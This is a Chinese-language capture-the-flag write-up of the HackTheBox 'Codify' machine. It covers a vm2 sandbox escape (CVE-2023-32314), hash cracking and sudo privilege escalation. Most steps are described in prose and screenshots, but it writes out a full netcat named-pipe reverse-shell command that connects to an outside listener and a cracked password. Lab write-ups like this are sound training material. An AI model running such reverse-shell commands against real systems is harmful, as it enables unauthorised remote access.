先把codify.htb加入/etc/hosts
![image](https://hackmd.io/_uploads/H10yHw_4a.png)

用nmap掃了後有開啟22,80跟3000 port
![image](https://hackmd.io/_uploads/rkLiBDOET.png)

透過主頁的介紹大致知道他是可以線上測試node.js的網站
![image](https://hackmd.io/_uploads/SJh1PwO46.png)

關於這邊有寫到她是用vm2的library 
![image](https://hackmd.io/_uploads/Byo--__4a.png)

點開後他是使用3.9.16版本 去找有沒有相關漏洞
![image](https://hackmd.io/_uploads/rk_HW_dNp.png)

找到一個可以ByPass sandbox的漏洞 [CVE-2023-32314](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244)
![image](https://hackmd.io/_uploads/ByfsOtOVT.png)

貼上她的payload後嘗試whoami 指令有成功讀取到 所以可以來嘗試看看reverse shell
![image](https://hackmd.io/_uploads/rk-qtYdV6.png)

在本地開啟一個8888 port監聽
![image](https://hackmd.io/_uploads/Hyw1sYuNp.png)

在payload裡用上`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.23 8888 >/tmp/f` 後成功get shell(不能用bin/bash 不確定是不是因為沒開/dev/tcp的關係) 
![image](https://hackmd.io/_uploads/S1ydiFuVT.png)

裏頭有一個joshua 可是沒有權限進入 所以感覺是要去找他的ssh密碼
![image](https://hackmd.io/_uploads/HkkBP5u46.png)


可是裡面資料夾有點多 翻不太到想要的東西 想說用linpeas看看
![image](https://hackmd.io/_uploads/BJLGPquE6.png)

但不知道為什麼不能解析 github .com
![image](https://hackmd.io/_uploads/HJmKvqON6.png)

最後是在var/www/contact這個路徑下找到一個tickets.db
![image](https://hackmd.io/_uploads/S1Xz9cuVp.png)

其中這段看起來就很像是joshua的ssh密碼
![image](https://hackmd.io/_uploads/ByqB9qdVp.png)

拿去用john爆破成功爆出一段密碼 spongebob1
![image](https://hackmd.io/_uploads/SJMJ65_4p.png)

成功透過ssh登入了joshua身分
![image](https://hackmd.io/_uploads/BkQIpq_VT.png)

拿到user flag
![image](https://hackmd.io/_uploads/B1T_a5OEp.png)

用sudo -l 後發現有一個root權限下也可以運作的檔案 /opt/scripts/mysql-backup.sh
![image](https://hackmd.io/_uploads/SkT8biuEa.png)

裏頭的程式碼
![image](https://hackmd.io/_uploads/ryYNj3uEa.png)

寫一個python 腳本來跑出密碼
![image](https://hackmd.io/_uploads/HkI2c3_46.png)

成功爆出密碼
![image](https://hackmd.io/_uploads/ryfqns_4a.png)

拿來登入root 並成功得到flag
![image](https://hackmd.io/_uploads/HJJUhhONa.png)
